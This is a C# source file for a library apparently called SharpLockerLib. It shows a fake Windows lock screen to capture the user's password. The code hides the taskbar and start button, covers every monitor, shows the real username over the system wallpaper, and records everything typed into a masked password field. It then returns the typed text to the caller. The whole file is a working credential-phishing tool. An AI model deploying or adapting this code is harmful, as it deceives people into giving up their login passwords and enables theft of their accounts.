using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace  SharpLockerLib
{
    public class Runner
    {
        public static String Run()
        {
            return Run("");
        }

        public static String Run(string backGroundPath)
        {
            Application.EnableVisualStyles();
            try
            {
                Application.SetCompatibleTextRenderingDefault(false);
            } catch(Exception)
            {
                // avoid exception if an IWin32Window-Object was created already
            }
            
            StrResult res = new StrResult();
            Form1 f;
            if (backGroundPath.Length > 1)
            {
                f = new Form1(ref res, backGroundPath);
            } else
            {
                f = new Form1(ref res);
            }
            

            foreach (var screen in Screen.AllScreens)
            {
                if (!screen.Primary)
                {
                    Form form = new Form();
                    form.WindowState = FormWindowState.Normal;
                    form.StartPosition = FormStartPosition.Manual;
                    form.Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top);
                    form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
                    form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                    form.BackColor = Color.Black;
                    form.Visible = false;
                    form.Show(f);
                }
            }

            f.Show();
            f.BringToFront();
            f.Activate(); // assure this form is the active window
            while (!f.IsDisposed)
            {
                Application.DoEvents();
            }
 
            return "SharpLocker input: " + res.val;
        }
    }

    class StrResult
    {
        public String val { get; set; }
    }

    partial class Form1 : Form
    {
        StrResult input;

        public Form1(ref StrResult result) : this(ref result, @"C:\Windows\Web\Wallpaper\Windows\img0.jpg")
        {
        }

        public Form1(ref StrResult result, string userBackground)
        {
            this.input = result;
            InitializeComponent();
            Taskbar.Hide();
            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            // ToDo: Replace with user background image
            // this requires access to Windows.System.UserProfile.LockScreen.OriginalImageFile.OriginalString
            // without beeing an UWP app
            Image myimage = new Bitmap(userBackground);
            BackgroundImage = myimage;
            BackgroundImageLayout = ImageLayout.Stretch;
            this.TopMost = true;
            string userName = System.Environment.UserName.ToString();
            label2.Text = userName;
            label2.BackColor = System.Drawing.Color.Transparent;
            // ToDo: rework components for proper layout on non 1080p primary screen resoltuions
            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
            int bottomname = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 95;
            textBox2.Top = usernameloch;
            userPic.Top = usericonh;
            confirmBtn.Top = buttonh;
            label2.Top = usernameh;
            label1.Top = locked;
            textBox2.UseSystemPasswordChar = true;


        }

        class Taskbar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            [DllImport("user32.dll")]
            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

            [DllImport("user32.dll")]
            private static extern int GetDesktopWindow();

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            protected static int Handle
            {
                get
                {
                    return FindWindow("Shell_TrayWnd", "");
                }
            }

            protected static int HandleOfStartButton
            {
                get
                {
                    int handleOfDesktop = GetDesktopWindow();
                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                    return handleOfStartButton;
                }
            }

            private Taskbar()
            {
                // hide ctor
            }

            public static void Show()
            {
                ShowWindow(Handle, SW_SHOW);
                ShowWindow(HandleOfStartButton, SW_SHOW);
            }

            public static void Hide()
            {
                ShowWindow(Handle, SW_HIDE);
                ShowWindow(HandleOfStartButton, SW_HIDE);
            }
        }

        private void userPic_Click(object sender, EventArgs e)
        {

        }


        private void label2_Click(object sender, EventArgs e)
        {

        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {    
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            this.input.val = textBox2.Text;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        
        private void confirmBtnClick(object sender, EventArgs e)
        {
            Taskbar.Show();
            //System.Windows.Forms.Application.Exit();
            this.Close();
        }
    }
}
